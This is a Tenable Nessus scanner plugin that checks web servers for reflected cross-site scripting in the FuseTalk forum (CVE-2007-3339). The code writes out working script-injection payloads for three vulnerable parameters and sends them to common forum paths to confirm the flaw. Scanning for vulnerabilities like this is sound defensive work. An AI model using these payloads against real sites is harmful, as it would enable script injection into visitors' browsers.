#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25553);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2007-3339");
  script_bugtraq_id(24563, 24564);
  script_osvdb_id(37141, 37142, 37143);

  script_name(english:"FuseTalk Multiple Script XSS");
  script_summary(english:"Checks for XSS flaws");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a ColdFusion script that is susceptible
to multiple cross-site scripting attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running FuseTalk, a discussion forum implemented in
ColdFusion. 

The version of FuseTalk installed on the remote host fails to properly
sanitize user-supplied input to several parameters and scripts before
using it to generate dynamic content.  An unauthenticated, remote
attacker may be able to leverage this issue to inject arbitrary HTML
or script code into a user's browser to be executed within the
security context of the affected site." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2007/Jun/256" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2007/Jun/257" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2007/06/21");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/06/20");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:fusetalk:fusetalk");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


xss = string("alert('", SCRIPT_NAME, "')");
if (thorough_tests) 
{
  exploits = make_list(
    string("/include/error/autherror.cfm?errorcode=1&FTVAR_LINKP=", urlencode(str:'"></a><script>' + xss + '</script><a href="')),
    string("/include/error/autherror.cfm?errorcode=1&FTVAR_URLP=", urlencode(str:'"><script>' + xss + "</script>")),
    string("/include/common/comfinish.cfm?FTRESULT.errorcode=0&FTVAR_SCRIPTRUN=", urlencode(str:xss))
  );
}
else 
{
  exploits = make_list(
    string("/include/error/autherror.cfm?errorcode=1&FTVAR_LINKP=", urlencode(str:'"></a><script>' + xss + '</script><a href="'))
  );
}


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/fusetalk/forum", "/forums/forum", "/forum/forum", "/fusetalk/blog", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue.
  info = "";
  foreach exploit (exploits)
  {
    w = http_send_recv3(method:"GET", item:string(dir, exploit), port:port);
    if (isnull(w)) exit(1, "The web server did not answer");
    res = w[2];

    # There's a problem if we see an alert with our exploit.
    if (
      (
       "FTVAR_LINKP=" >< exploit && 
       string('<a href=""></a><script>', xss, "</script><a") >< res
      ) ||
      (
       "FTVAR_URLP=" >< exploit && 
       string('<img src=""><script>', xss, "</script>fusetalk.gif") >< res
      ) ||
      (
       "FTVAR_SCRIPTRUN=" >< exploit && 
       "{ts" >< res &&
       string("<script>", xss, "</script>") >< res
      )
    ) info += '  ' + dir + exploit + '\n';
  }

  if (info)
  {
    report = string(
      "\n",
      "The following URI(s) demonstrate the issues :\n",
      "\n",
      info
    );
    security_warning(port:port, extra:report);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
